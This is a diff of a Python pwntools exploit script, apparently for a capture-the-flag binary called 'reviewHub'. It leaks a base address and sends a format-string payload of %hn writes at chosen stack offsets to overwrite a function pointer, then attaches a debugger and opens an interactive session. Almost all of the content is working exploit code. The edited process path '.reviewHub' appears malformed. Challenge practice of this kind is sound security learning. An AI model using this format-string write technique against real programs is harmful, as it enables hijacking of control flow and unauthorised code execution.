@@ -1,12 +1,9 @@
 from pwn import*
 
-p = process('./reviewHub')
+p = process('.reviewHub')
 
 value = 0xfffffe34a58948
 address = 0x4010
-
-p.recvuntil(b'(2-1000): ')
-p.sendline(b'5')
 
 def leakBase():
     p.recvuntil(b'(up to 256 characters): ')
@@ -42,10 +39,10 @@ def overwriteExecutableFunction():
     v2 = (value >> 0x10) & 0xffff
     v3 = (value >> 0x20) & 0xffff
     v4 = (value >> 0x30) & 0xffff
-    payload = bytes(f"%{v4}c%39$hn", "utf-8")
-    payload += bytes(f"%{v2-v4}c%40$hn", "utf-8")
-    payload += bytes(f"%{v1-v2}c%41$hn", "utf-8")
-    payload += bytes(f"%{v3-v1}c%42$hn", "utf-8")
+    payload = bytes(f"%{v4}c%37$hn", "utf-8")
+    payload += bytes(f"%{v2-v4}c%38$hn", "utf-8")
+    payload += bytes(f"%{v1-v2}c%39$hn", "utf-8")
+    payload += bytes(f"%{v3-v1}c%40$hn", "utf-8")
     payload += b'A' * 0x6
     payload += p64(address+0x6)
     payload += p64(address+0x2)
@@ -55,6 +52,7 @@ def overwriteExecutableFunction():
     log.success("sent function overwrite payload")
 
 overwriteExecutableFunction()
+gdb.attach(p)
 
 p.interactive()
 
